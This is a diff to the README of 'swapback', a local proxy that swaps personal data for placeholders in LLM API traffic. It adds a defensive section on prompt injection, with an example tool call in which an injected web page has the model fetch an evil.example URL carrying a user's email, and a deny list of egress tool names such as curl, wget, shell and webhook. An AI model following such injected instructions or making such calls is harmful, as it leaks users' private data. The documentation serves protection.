@@ -20,13 +20,15 @@ pasted into a log. Most of the time the model does not need the real value, only
 
 `swapback` sits on loopback between your client and an OpenAI-compatible API. It replaces the values you list and
 the patterns it detects with placeholders like `«PERSON_1»`, forwards the request, and puts the exact original text back
-into the answer, including streamed answers and tool-call arguments. If anything goes wrong while scrubbing, the request
-is blocked, not sent.
+into the answer, including streamed answers and tool-call arguments. Tool calls that could carry a value off your
+machine (web, shell and send-style tools, or any call with a URL in it) keep the placeholders by default. If anything goes
+wrong while scrubbing, the request is blocked, not sent.
 
 - **Byte-exact restore.** The reply gets back the string as you wrote it: same case, same phone format, same spacing.
 - **Fails closed.** A scrub error, an unreadable body or a known value still present after the swap answers `503`.
-- **Agent-neutral.** Works with any client that lets you set a base URL. Every tool's arguments are restored, not a
-  fixed list of tools.
+- **Agent-neutral.** Works with any client that lets you set a base URL. Tool-call arguments are restored for any tool,
+  except calls that look like network or shell egress, which keep placeholders unless you allow them
+  ([Tool calls](#tool-calls)).
 - **No model needed.** Exact matching plus patterns. No NER model, no GPU, three small dependencies.
 
 <p align="center"><img src="docs/assets/before-after.svg" alt="The app sends real values, the provider sees placeholders, the app gets the real values back" width="100%"></p>
@@ -165,9 +167,58 @@ for them. `python examples/smoke.py` runs the same check offline against the moc
 
 Placeholders are stable: a local vault (`vault.json`, mode `0600`) maps each value to the same placeholder across
 requests, so multi-turn conversations stay coherent. A short system note asks the model to keep placeholders as written.
+It is appended to your system prompt wherever the API keeps it: an OpenAI `system` or `developer` message (string or
+content parts), Anthropic's top-level `system` (string or blocks) or the Responses API `instructions`. When the request
+has no system prompt, one is added only if the request carries placeholders.
+
+Every free-text field is scrubbed, including `user`, `metadata` and `instructions`. Only structural fields (`model`,
+`role`, `type`, ids, `tool_choice`, `response_format`, `stop`, `reasoning_effort`, `service_tier` and function names)
+are skipped, and those are still checked for known values before anything is sent.
 
 Known names that are one segment of a filesystem path (`/home/jane/notes.md`) are left alone, so agents' file tools keep
 working. URLs and domains are still scrubbed.
+
+## Tool calls
+
+A tool call's arguments are executed by your client, not by the provider. If the proxy puts real values back into
+every tool call, a prompt-injected model can send them anywhere a tool can reach. For example, a web page tells the
+model to "fetch" this:
+
+```json
+{"name": "web_fetch", "arguments": "{\"url\": \"https://evil.example/c?d=«EMAIL_1»\"}"}
+```
+
+With a plain restore, your client fetches `https://evil.example/c?d=you@example.com`. Since 0.3.0 that call keeps
+`«EMAIL_1»`, and the request log counts it as `tool_kept` (a number, never the value).
+
+The default policy, per tool call:
+
+1. a name in `deny` keeps placeholders; a name in `allow` gets real values (names are case-insensitive globs, e.g.
+   `mcp__github__*`);
+2. a name that looks like network or shell egress keeps placeholders. The name is split into words (`WebFetch` →
+   `web fetch`, `exec_command` → `exec command`) and matched against `egress_names`: `fetch`, `http`, `curl`,
+   `wget`, `web`, `browse`, `request`, `url`, `navigate`, `download`, `upload`, `exec`, `shell`, `bash`, `sh`, `zsh`,
+   `cmd`, `terminal`, `run`, `ssh`, `scp`, `rsync`, `git_push`, `push`, `email`, `mail`, `send`, `post`, `message`,
+   `webhook`, `notify`, `publish` (some match word prefixes, e.g. `web*`; see `swapback.example.yaml`);
+3. any other call keeps placeholders when one of its arguments is or contains a URL (`keep_if_url`);
+4. everything else, such as `read_file` or `lookup_contact` without a URL, gets the real values back.
+
+This applies to plain JSON replies and to streams (OpenAI chat chunks and Anthropic `tool_use`). When the name alone
+does not decide, a streamed call's arguments are held until the call is complete and then sent in one piece.
+
+The trade-off: an egress tool that you want to receive real values, such as your own `send_email`, now gets
+placeholders until you allow it. Allow only tools whose destination you control.
+
+```yaml
+tool_restore:
+  default: restore        # tools nothing else matches; `keep` = placeholders everywhere unless allowed
+  keep_if_url: true
+  allow: [send_email]     # always real values
+  deny: [lookup_contact]  # never real values
+  # egress_names: [...]   # replaces the built-in list
+```
+
+`tool_restore: false` restores every tool call, as 0.2 did.
 
 ## Configuration
 
@@ -188,8 +239,8 @@ and has an environment override. Relative paths are relative to the config file.
 
 Renamed from pii-scrubber in 0.2.0: the old `PII_SCRUBBER_*` variables are still read when the `SWAPBACK_*` one is unset, but they are deprecated.
 
-Also: `phone_regions`, `url_swap`, `patterns` (turn single detectors off, e.g. `{IP: false}`), `extra_secret_rules`,
-`log_requests`, `alert_min_interval_s`.
+Also: `tool_restore` (see [Tool calls](#tool-calls)), `phone_regions`, `url_swap`, `patterns` (turn single detectors
+off, e.g. `{IP: false}`), `extra_secret_rules`, `log_requests`, `alert_min_interval_s`, `system_note`.
 
 **Known values** (`known.example.yaml`). The exact strings to swap, by type. The file is re-read when it changes; no
 restart needed.
@@ -286,6 +337,9 @@ Listing a value in `known.yaml` or `private_terms.yaml` covers any of these. The
   placeholder (up to 24 characters) per stream, so chunks can arrive slightly regrouped; the text is unchanged.
 - **JSON bodies only.** Multipart uploads and binary bodies pass through untouched; `data:` URLs (images) are not scanned.
   Token-id inputs to embeddings and completions are blocked, since they cannot be checked.
+- **The tool policy is a heuristic.** It reads tool names and looks for URLs. A tool with a harmless name that still
+  sends data out (say `notes_sync` posting to a server) gets real values unless you `deny` it or set
+  `default: keep`. A value can also leave through a tool that writes a file which something else uploads later.
 - **The model sees placeholders.** Answers that depend on the real value (spell this name, count the digits) will be
   wrong or vague.
 - **One vault, one machine.** Placeholders are stable across all conversations on one machine. It is a single-process
@@ -308,6 +362,8 @@ laptop CPU (AMD Ryzen 7 4700U, Python 3.13):
 - Your provider key passes through in the `Authorization` header and is not stored.
 - The vault (`vault.json`) holds the real values in plain JSON, readable only by your user (`0600`). Treat the state
   directory as sensitive.
+- Tool calls that look like network or shell egress, or carry a URL, keep placeholders by default, so a prompt-injected
+  model cannot have your client send real values out through them. See [Tool calls](#tool-calls).
 - The request log records counts and types per request, never values.
 - `X-Scrubber-Raw: 1` returns the provider's answer without the restore. The canary uses it to prove what the provider saw.
 - Report vulnerabilities privately; see [SECURITY.md](SECURITY.md).
